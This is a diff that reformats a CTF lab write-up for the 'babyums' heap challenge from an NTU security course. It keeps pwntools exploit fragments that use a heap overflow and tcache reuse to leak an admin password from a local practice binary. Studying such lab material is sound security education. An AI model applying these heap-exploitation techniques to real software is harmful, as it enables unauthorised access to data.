@@ -1,20 +1,19 @@
 ---
-title: Simple PWN 0x19(Lab - `babyums` - flag 1)
+title: Simple PWN 0x19(Lab - babyums - flag 1)
 tags: [CTF, PWN, eductf]
 
 category: "Security Course｜NTU CS｜PWN"
 date: 2023-01-28
 ---
 
-# Simple PWN 0x19(Lab - `babyums` - flag 1)
+# Simple PWN 0x19(Lab - babyums - flag 1)
 <!-- more -->
 ###### tags: `CTF` `PWN` `eductf`
 
 Version: Ubuntu 20.04
 
 ## Original Code
-:::spoiler Original Code
-```cpp=
+```cpp
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -151,7 +150,6 @@ int main()
     return 0;
 }
 ```
-:::
 
 ### Something wrong
 * Heap overflow
@@ -165,7 +163,7 @@ int main()
 If we can use heap overflow to overlap the `user k`'s `*data`, then we can let it point to admin's password and use `show_users()` to print it out
 1. leak admin password address
 It's very straight forward, if we delete two user, user 2 first and then user 1, at the same time, the `fd` of user 1 will point to the data of user 2. Then we can use `show_user()` to leak the address and try to find `admin_pass_addr` by minus offset
-    ```python!
+    ```python
     edit_data(0, 0x8, b'a')    # Must add this line to use heap overflow
     add_user(1, b'a'*8, b'aaaa')
     edit_data(1, 0x20, b'a')
@@ -181,13 +179,13 @@ It's very straight forward, if we delete two user, user 2 first and then user 1,
     ![](https://imgur.com/ZicILFr.png)
 
 2. Get the memory back from `tcache`
-    ```python!
+    ```python
     add_user(1, b'a'*8, b'aaaa')
     edit_data(1, 0x20, b'a')
     ```
 
 3. Construct fake chunk that the data pointer will point to the `admin_pass_addr`
-    ```python!
+    ```python
     fake_chunk = flat(
         b'a'*8, b'a'*8,
         b'a'*8, 0x31,
@@ -205,14 +203,14 @@ It's very straight forward, if we delete two user, user 2 first and then user 1,
 
 ### Easy solution
 Try to let the admin user be the data of other user, then we can use `show_user` function to print it out
-```python!
+```python
 add_user(1, b'a'*8, b'aaaa')
 del_user(0)
 edit_data(1, 0x20, b'b'*16)
 show_user()
 ```
 1. First, we add user 1
-        ![](https://imgur.com/TrRwqJY.png)
+    ![](https://imgur.com/TrRwqJY.png)
 2. Then we delete user 0(admin), so that it'll be put into `tcache`(`0x30`)
     ![](https://imgur.com/GlClYCU.png)
 3. When we use `edit_data` function, it'll get a memory space from sub-bin of `tcache` be user1's data, which is what we delete. In addition, in order to print the data section out, must change the `NULL` byte to garbage
@@ -221,8 +219,8 @@ show_user()
     ![](https://imgur.com/mUA6ubZ.png)
 
 
-:::spoiler Whole exploit
-```python=
+Whole Exploit
+```python
 from pwn import *
 
 r = process('./chal')
@@ -287,4 +285,3 @@ show_user()
 
 r.interactive()
 ```
-:::
